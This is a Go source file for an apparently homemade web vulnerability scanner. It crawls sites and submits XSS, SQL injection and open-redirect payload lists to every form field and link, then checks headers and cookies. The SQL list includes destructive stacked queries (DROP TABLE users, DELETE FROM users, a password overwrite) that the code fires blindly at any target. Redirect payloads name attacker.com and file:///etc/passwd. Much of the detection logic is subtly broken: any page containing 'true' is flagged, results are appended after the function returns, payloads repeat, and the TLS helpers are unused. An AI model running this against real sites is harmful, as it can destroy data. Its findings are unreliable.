package main

import (
	"crypto/x509"
	"net/url"
	"regexp"
	"strings"

	"github.com/gocolly/colly"
)

// XSSScanner checks for Cross-Site Scripting vulnerabilities
type XSSScanner struct{}

func (s *XSSScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability
	
	// Enhanced XSS payloads
	xssPayloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"'><script>alert(1)</script>",
		"<svg/onload=alert(1)>",
		"<body onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<select onmouseover=alert(1)>",
		"<iframe src=javascript:alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<marquee onstart=alert(1)>",
		"<div onmouseover=alert(1) style=width:100%;height:100%;position:fixed;top:0;left:0;>",
		"<svg><script>alert&#40;1&#41;</script></svg>",
		"<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><set attributeName=onload to=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
		"<svg><animate attributeName=onload values=alert(1)>",
	}

	// DOM-based XSS detection
	c.OnHTML("script", func(e *colly.HTMLElement) {
		scriptContent := e.Text
		domXSSPatterns := []string{
			"document\\.write\\(",
			"innerHTML\\s*=",
			"outerHTML\\s*=",
			"eval\\(",
			"setTimeout\\(",
			"setInterval\\(",
			"location\\.href\\s*=",
			"location\\.assign\\(",
			"location\\.replace\\(",
		}

		for _, pattern := range domXSSPatterns {
			if matched, _ := regexp.MatchString(pattern, scriptContent); matched {
				vulns = append(vulns, Vulnerability{
					URL:         e.Request.URL.String(),
					Type:        "DOM-based XSS",
					Severity:    "High",
					Description: "Potential DOM-based XSS vulnerability found in script",
					Evidence:    "Pattern matched: " + pattern,
				})
			}
		}
	})

	// Enhanced form testing
	c.OnHTML("form", func(e *colly.HTMLElement) {
		formURL := e.Request.AbsoluteURL(e.Attr("action"))
		method := strings.ToUpper(e.Attr("method"))
		if method == "" {
			method = "GET"
		}

		// Test each input field
		e.ForEach("input, textarea, select", func(_ int, input *colly.HTMLElement) {
			inputName := input.Attr("name")
			if inputName == "" {
				return
			}

			// Test with different encodings
			for _, payload := range xssPayloads {
				encodedPayload := url.QueryEscape(payload)
				if method == "POST" {
					data := map[string]string{
						inputName: payload,
					}
					c.Post(formURL, data)
					// Try with encoded payload
					data[inputName] = encodedPayload
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, payload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
					// Try with encoded payload
					q.Set(inputName, encodedPayload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}
			}
		})
	})

	// Enhanced response checking
	c.OnResponse(func(r *colly.Response) {
		body := string(r.Body)
		contentType := r.Headers.Get("Content-Type")
		
		// Only check for XSS in HTML responses
		if strings.Contains(contentType, "text/html") {
			for _, payload := range xssPayloads {
				// Check for unencoded payload
				if strings.Contains(body, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Reflected XSS",
						Severity:    "High",
						Description: "Reflected Cross-Site Scripting vulnerability found",
						Evidence:    "Payload reflected in response: " + payload,
					})
				}
				
				// Check for encoded payload
				encodedPayload := url.QueryEscape(payload)
				if strings.Contains(body, encodedPayload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Reflected XSS (Encoded)",
						Severity:    "High",
						Description: "Reflected Cross-Site Scripting vulnerability found with encoded payload",
						Evidence:    "Encoded payload reflected in response: " + encodedPayload,
					})
				}
			}
		}
	})

	return vulns
}

// SQLInjectionScanner checks for SQL Injection vulnerabilities
type SQLInjectionScanner struct{}

func (s *SQLInjectionScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	// Enhanced SQL Injection payloads
	sqlPayloads := []string{
		// Basic SQL Injection
		"' OR '1'='1",
		"' OR 1=1--",
		"1' ORDER BY 1--",
		"1' UNION SELECT NULL--",
		// Time-based SQL Injection
		"' WAITFOR DELAY '0:0:5'--",
		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
		"' AND (SELECT COUNT(*) FROM tabname) > 0--",
		// Error-based SQL Injection
		"' AND 1=CONVERT(int,(SELECT @@version))--",
		"' AND 1=CONVERT(int,(SELECT db_name()))--",
		"' AND 1=CONVERT(int,(SELECT user_name()))--",
		// Union-based SQL Injection
		"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
		"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
		"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
		// Boolean-based SQL Injection
		"' AND 1=1--",
		"' AND 1=2--",
		"' AND 'x'='x",
		"' AND 'x'='y",
		// Stacked Queries
		"'; DROP TABLE users--",
		"'; DELETE FROM users--",
		"'; UPDATE users SET password='hacked'--",
		// NoSQL Injection
		"{\"$gt\": \"\"}",
		"{\"$ne\": null}",
		"{\"$where\": \"1==1\"}",
		// MongoDB Injection
		"{\"$regex\": \".*\"}",
		"{\"$exists\": true}",
		"{\"$type\": 1}",
	}

	// Enhanced SQL error patterns
	sqlErrorPatterns := []string{
		// MySQL Errors
		"SQL syntax.*MySQL",
		"Warning.*mysql_",
		"valid MySQL result",
		"check the manual that corresponds to your (MySQL|MariaDB) server version",
		"MySqlClient\\.",
		"com\\.mysql\\.jdbc",
		"MySQLSyntaxErrorException",
		"Unknown column '[^']+' in 'field list'",
		"Table '[^']+' doesn't exist",
		// PostgreSQL Errors
		"PostgreSQL.*ERROR",
		"ERROR: syntax error at or near",
		"ERROR: relation \"[^']+\" does not exist",
		"ERROR: column \"[^']+\" does not exist",
		// Oracle Errors
		"ORA-[0-9][0-9][0-9][0-9]",
		"Oracle error",
		"SQL command not properly ended",
		"ORA-00921: unexpected end of SQL command",
		"ORA-00933: SQL command not properly ended",
		// SQL Server Errors
		"Microsoft SQL Server",
		"SQLServer JDBC Driver",
		"ODBC SQL Server Driver",
		"Warning.*(mssql|sqlsrv)_",
		"\\[SQL Server\\]",
		"System\\.Data\\.SqlClient\\.",
		"Unclosed quotation mark after the character string",
		// SQLite Errors
		"SQLite/JDBCDriver",
		"SQLite\\.Exception",
		"System\\.Data\\.SQLite\\.SQLiteException",
		// General SQL Errors
		"SQL syntax.*",
		"Syntax error or access violation",
		"Unexpected end of SQL command",
		"Warning: mysql_",
		"valid MySQL result",
		"check the manual that corresponds to your (MySQL|MariaDB) server version",
		"Unknown column '[^']+' in 'field list'",
		"MySqlClient\\.",
		"com\\.mysql\\.jdbc",
		"Zend_Db_",
		"PGSQL_",
		"ODBC SQL Server Driver",
		"Microsoft OLE DB Provider for SQL Server",
		"Unclosed quotation mark after the character string",
		"Microsoft SQL Server",
	}

	// Enhanced form testing
	c.OnHTML("form", func(e *colly.HTMLElement) {
		formURL := e.Request.AbsoluteURL(e.Attr("action"))
		method := strings.ToUpper(e.Attr("method"))
		if method == "" {
			method = "GET"
		}

		e.ForEach("input, textarea, select", func(_ int, input *colly.HTMLElement) {
			inputName := input.Attr("name")
			if inputName == "" {
				return
			}

			// Test with different encodings and techniques
			for _, payload := range sqlPayloads {
				// Test with original payload
				if method == "POST" {
					data := map[string]string{
						inputName: payload,
					}
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, payload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}

				// Test with URL encoded payload
				encodedPayload := url.QueryEscape(payload)
				if method == "POST" {
					data := map[string]string{
						inputName: encodedPayload,
					}
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, encodedPayload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}

				// Test with double encoded payload
				doubleEncodedPayload := url.QueryEscape(encodedPayload)
				if method == "POST" {
					data := map[string]string{
						inputName: doubleEncodedPayload,
					}
					c.Post(formURL, data)
				} else {
					u, _ := url.Parse(formURL)
					q := u.Query()
					q.Set(inputName, doubleEncodedPayload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())
				}
			}
		})
	})

	// Enhanced response checking
	c.OnResponse(func(r *colly.Response) {
		body := string(r.Body)
		
		// Check for SQL errors in response
		for _, pattern := range sqlErrorPatterns {
			if matched, _ := regexp.MatchString(pattern, body); matched {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "SQL Injection",
					Severity:    "Critical",
					Description: "SQL Injection vulnerability found",
					Evidence:    "SQL error message detected: " + pattern,
				})
			}
		}

		// Check for boolean-based SQL injection
		if strings.Contains(body, "true") || strings.Contains(body, "false") {
			vulns = append(vulns, Vulnerability{
				URL:         r.Request.URL.String(),
				Type:        "Boolean-based SQL Injection",
				Severity:    "High",
				Description: "Potential boolean-based SQL injection vulnerability",
				Evidence:    "Boolean response detected in response body",
			})
		}
	})

	return vulns
}

// OpenRedirectScanner checks for Open Redirect vulnerabilities
type OpenRedirectScanner struct{}

func (s *OpenRedirectScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	// Enhanced Open Redirect payloads
	redirectPayloads := []string{
		// Basic redirects
		"//google.com",
		"//google.com/",
		"//google.com/%2e%2e",
		"//google.com/%2e%2e/",
		"//google.com/%2e%2e%2f",
		"//google.com/%2e%2e%2f/",
		"//google.com/%2f%2e%2e",
		"//google.com/%2f%2e%2e/",
		"//google.com/%2f%2e%2e%2f",
		"//google.com/%2f%2e%2e%2f/",
		// Protocol-relative URLs
		"//attacker.com",
		"//attacker.com/",
		"//attacker.com/%2e%2e",
		"//attacker.com/%2e%2e/",
		// Encoded characters
		"%2f%2fgoogle.com",
		"%2f%2fgoogle.com%2f",
		"%2f%2fgoogle.com%2f%2e%2e",
		"%2f%2fgoogle.com%2f%2e%2e%2f",
		// Double encoding
		"%252f%252fgoogle.com",
		"%252f%252fgoogle.com%252f",
		"%252f%252fgoogle.com%252f%252e%252e",
		"%252f%252fgoogle.com%252f%252e%252e%252f",
		// Mixed encoding
		"%2f%2fgoogle.com%2f%252e%252e",
		"%2f%2fgoogle.com%2f%252e%252e%2f",
		// JavaScript protocol
		"javascript:alert(1)",
		"javascript:alert(document.domain)",
		"javascript:void(0)",
		// Data protocol
		"data:text/html,<script>alert(1)</script>",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		// Meta refresh
		"<meta http-equiv=\"refresh\" content=\"0;url=//google.com\">",
		// HTML5 history API
		"javascript:history.pushState({},'','//google.com')",
		// Relative paths
		"./google.com",
		"../google.com",
		"../../google.com",
		// Protocol handlers
		"file:///etc/passwd",
		"ftp://attacker.com",
		"telnet://attacker.com",
		// Unicode characters
		"//google.com\u2028",
		"//google.com\u2029",
		// Null bytes
		"//google.com%00",
		"//google.com%00/",
	}

	// Enhanced redirect parameter detection
	redirectParams := []string{
		"redirect",
		"url",
		"next",
		"return",
		"returnTo",
		"return_to",
		"returnUrl",
		"return_url",
		"redir",
		"redirect_uri",
		"redirect_url",
		"redirectUrl",
		"redirectTo",
		"redirect_to",
		"rurl",
		"destination",
		"dest",
		"target",
		"targetUrl",
		"target_url",
		"targetUri",
		"target_uri",
		"u",
		"link",
		"href",
		"src",
		"file",
		"page",
		"view",
		"path",
		"folder",
		"dir",
		"directory",
		"location",
		"loc",
		"goto",
		"go",
		"returnPath",
		"return_path",
		"returnUrl",
		"return_url",
		"returnUri",
		"return_uri",
		"callback",
		"callback_url",
		"callbackUrl",
		"callback_uri",
		"callbackUri",
	}

	// Check all links and forms
	c.OnHTML("a[href], form[action], link[href], script[src], img[src], iframe[src]", func(e *colly.HTMLElement) {
		// Get the attribute value based on the element type
		var attrValue string
		switch e.Name {
		case "a", "link":
			attrValue = e.Attr("href")
		case "form":
			attrValue = e.Attr("action")
		case "script", "img", "iframe":
			attrValue = e.Attr("src")
		}

		if attrValue == "" {
			return
		}

		// Check if the attribute contains any redirect parameters
		for _, param := range redirectParams {
			if strings.Contains(strings.ToLower(attrValue), param) {
				// Test with all payloads
				for _, payload := range redirectPayloads {
					redirectURL := e.Request.AbsoluteURL(attrValue)
					u, err := url.Parse(redirectURL)
					if err != nil {
						continue
					}

					// Test with different parameter positions
					q := u.Query()
					
					// Test as query parameter
					q.Set(param, payload)
					u.RawQuery = q.Encode()
					c.Visit(u.String())

					// Test as path parameter
					pathParts := strings.Split(u.Path, "/")
					for i := range pathParts {
						if strings.Contains(strings.ToLower(pathParts[i]), param) {
							pathParts[i] = payload
							u.Path = strings.Join(pathParts, "/")
							c.Visit(u.String())
						}
					}

					// Test as fragment
					u.Fragment = payload
					c.Visit(u.String())
				}
			}
		}
	})

	// Enhanced response checking
	c.OnResponse(func(r *colly.Response) {
		// Check Location header
		location := r.Headers.Get("Location")
		if location != "" {
			for _, payload := range redirectPayloads {
				if strings.Contains(location, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Open Redirect",
						Severity:    "Medium",
						Description: "Open Redirect vulnerability found",
						Evidence:    "Redirect to: " + location,
					})
				}
			}
		}

		// Check Refresh header
		refresh := r.Headers.Get("Refresh")
		if refresh != "" {
			for _, payload := range redirectPayloads {
				if strings.Contains(refresh, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Open Redirect (Meta Refresh)",
						Severity:    "Medium",
						Description: "Open Redirect vulnerability found in Refresh header",
						Evidence:    "Refresh header: " + refresh,
					})
				}
			}
		}

		// Check response body for meta refresh
		body := string(r.Body)
		if strings.Contains(body, "<meta http-equiv=\"refresh\"") {
			for _, payload := range redirectPayloads {
				if strings.Contains(body, payload) {
					vulns = append(vulns, Vulnerability{
						URL:         r.Request.URL.String(),
						Type:        "Open Redirect (Meta Refresh)",
						Severity:    "Medium",
						Description: "Open Redirect vulnerability found in meta refresh tag",
						Evidence:    "Meta refresh tag found with redirect to: " + payload,
					})
				}
			}
		}
	})

	return vulns
}

// HeaderSecurityScanner checks for security-related HTTP headers
type HeaderSecurityScanner struct{}

func (s *HeaderSecurityScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	c.OnResponse(func(r *colly.Response) {
		headers := r.Headers
		
		// Enhanced security headers check
		securityHeaders := map[string]struct {
			description string
			severity    string
			recommended string
		}{
			"X-Frame-Options": {
				description: "Missing X-Frame-Options header (clickjacking protection)",
				severity:    "Medium",
				recommended: "DENY or SAMEORIGIN",
			},
			"X-Content-Type-Options": {
				description: "Missing X-Content-Type-Options header (MIME-sniffing protection)",
				severity:    "Low",
				recommended: "nosniff",
			},
			"X-XSS-Protection": {
				description: "Missing X-XSS-Protection header (XSS protection)",
				severity:    "Low",
				recommended: "1; mode=block",
			},
			"Strict-Transport-Security": {
				description: "Missing HSTS header (HTTPS enforcement)",
				severity:    "High",
				recommended: "max-age=31536000; includeSubDomains; preload",
			},
			"Content-Security-Policy": {
				description: "Missing Content-Security-Policy header (XSS protection)",
				severity:    "High",
				recommended: "default-src 'self'",
			},
			"Referrer-Policy": {
				description: "Missing Referrer-Policy header (referrer information control)",
				severity:    "Low",
				recommended: "strict-origin-when-cross-origin",
			},
			"Permissions-Policy": {
				description: "Missing Permissions-Policy header (feature control)",
				severity:    "Low",
				recommended: "geolocation=(), microphone=(), camera=()",
			},
			"Cross-Origin-Opener-Policy": {
				description: "Missing Cross-Origin-Opener-Policy header (cross-origin isolation)",
				severity:    "Low",
				recommended: "same-origin",
			},
			"Cross-Origin-Embedder-Policy": {
				description: "Missing Cross-Origin-Embedder-Policy header (cross-origin isolation)",
				severity:    "Low",
				recommended: "require-corp",
			},
			"Cross-Origin-Resource-Policy": {
				description: "Missing Cross-Origin-Resource-Policy header (cross-origin resource control)",
				severity:    "Low",
				recommended: "same-origin",
			},
		}

		// Check for missing or misconfigured security headers
		for header, info := range securityHeaders {
			value := headers.Get(header)
			if value == "" {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Missing Security Header",
					Severity:    info.severity,
					Description: info.description,
					Evidence:    "Header not present in response",
				})
			} else {
				// Check for common misconfigurations
				switch header {
				case "X-Frame-Options":
					if !strings.EqualFold(value, "DENY") && !strings.EqualFold(value, "SAMEORIGIN") {
						vulns = append(vulns, Vulnerability{
							URL:         r.Request.URL.String(),
							Type:        "Misconfigured Security Header",
							Severity:    info.severity,
							Description: "X-Frame-Options header has invalid value",
							Evidence:    "Current value: " + value + ", Recommended: " + info.recommended,
						})
					}
				case "Strict-Transport-Security":
					if !strings.Contains(value, "max-age=") {
						vulns = append(vulns, Vulnerability{
							URL:         r.Request.URL.String(),
							Type:        "Misconfigured Security Header",
							Severity:    info.severity,
							Description: "HSTS header missing max-age directive",
							Evidence:    "Current value: " + value + ", Recommended: " + info.recommended,
						})
					}
				case "Content-Security-Policy":
					if strings.Contains(value, "unsafe-inline") || strings.Contains(value, "unsafe-eval") {
						vulns = append(vulns, Vulnerability{
							URL:         r.Request.URL.String(),
							Type:        "Misconfigured Security Header",
							Severity:    "Medium",
							Description: "Content-Security-Policy contains unsafe directives",
							Evidence:    "Current value: " + value,
						})
					}
				}
			}
		}

		// Enhanced cookie security checks
		cookies := headers.Values("Set-Cookie")
		for _, cookie := range cookies {
			// Check for Secure flag
			if !strings.Contains(cookie, "Secure") {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Insecure Cookie",
					Severity:    "Medium",
					Description: "Cookie set without Secure flag",
					Evidence:    "Cookie: " + cookie,
				})
			}

			// Check for HttpOnly flag
			if !strings.Contains(cookie, "HttpOnly") {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Insecure Cookie",
					Severity:    "Medium",
					Description: "Cookie set without HttpOnly flag",
					Evidence:    "Cookie: " + cookie,
				})
			}

			// Check for SameSite attribute
			if !strings.Contains(cookie, "SameSite") {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Insecure Cookie",
					Severity:    "Low",
					Description: "Cookie set without SameSite attribute",
					Evidence:    "Cookie: " + cookie,
				})
			} else if strings.Contains(cookie, "SameSite=None") && !strings.Contains(cookie, "Secure") {
				vulns = append(vulns, Vulnerability{
					URL:         r.Request.URL.String(),
					Type:        "Insecure Cookie",
					Severity:    "Medium",
					Description: "Cookie with SameSite=None must also have Secure flag",
					Evidence:    "Cookie: " + cookie,
				})
			}
		}

		// Check for server information disclosure
		server := headers.Get("Server")
		if server != "" {
			vulns = append(vulns, Vulnerability{
				URL:         r.Request.URL.String(),
				Type:        "Information Disclosure",
				Severity:    "Low",
				Description: "Server header reveals server information",
				Evidence:    "Server: " + server,
			})
		}

		// Check for X-Powered-By header
		poweredBy := headers.Get("X-Powered-By")
		if poweredBy != "" {
			vulns = append(vulns, Vulnerability{
				URL:         r.Request.URL.String(),
				Type:        "Information Disclosure",
				Severity:    "Low",
				Description: "X-Powered-By header reveals technology information",
				Evidence:    "X-Powered-By: " + poweredBy,
			})
		}
	})

	return vulns
}

// SSLScanner checks for SSL/TLS configuration issues
type SSLScanner struct{}

func (s *SSLScanner) Scan(startURL string, c *colly.Collector) []Vulnerability {
	var vulns []Vulnerability

	c.OnResponse(func(r *colly.Response) {
		// Only check for HTTP vs HTTPS
		if r.Request.URL.Scheme == "http" {
			vulns = append(vulns, Vulnerability{
				URL:         r.Request.URL.String(),
				Type:        "Missing HTTPS",
				Severity:    "High",
				Description: "Site is not using HTTPS",
				Evidence:    "URL scheme: " + r.Request.URL.Scheme,
			})
		}
	})

	return vulns
}

// Helper function to get TLS version string
func getTLSVersionString(version uint16) string {
	switch version {
	case 0x0301:
		return "TLS 1.0"
	case 0x0302:
		return "TLS 1.1"
	case 0x0303:
		return "TLS 1.2"
	case 0x0304:
		return "TLS 1.3"
	default:
		return "Unknown"
	}
}

// Helper function to check if a cipher suite is weak
func isWeakCipher(cipherSuite uint16) bool {
	weakCiphers := map[uint16]bool{
		0x0005: true, // TLS_RSA_WITH_RC4_128_SHA
		0x000A: true, // TLS_RSA_WITH_3DES_EDE_CBC_SHA
		0x002F: true, // TLS_RSA_WITH_AES_128_CBC_SHA
		0x0035: true, // TLS_RSA_WITH_AES_256_CBC_SHA
		0xC011: true, // TLS_ECDHE_RSA_WITH_RC4_128_SHA
		0xC012: true, // TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
		0xC013: true, // TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
		0xC014: true, // TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
		0xC009: true, // TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
		0xC00A: true, // TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
	}
	return weakCiphers[cipherSuite]
}

// Helper function to check if a signature algorithm is weak
func isWeakSignatureAlgorithm(algorithm x509.SignatureAlgorithm) bool {
	weakAlgorithms := map[x509.SignatureAlgorithm]bool{
		x509.MD2WithRSA:    true,
		x509.MD5WithRSA:    true,
		x509.SHA1WithRSA:   true,
		x509.DSAWithSHA1:   true,
		x509.ECDSAWithSHA1: true,
	}
	return weakAlgorithms[algorithm]
} 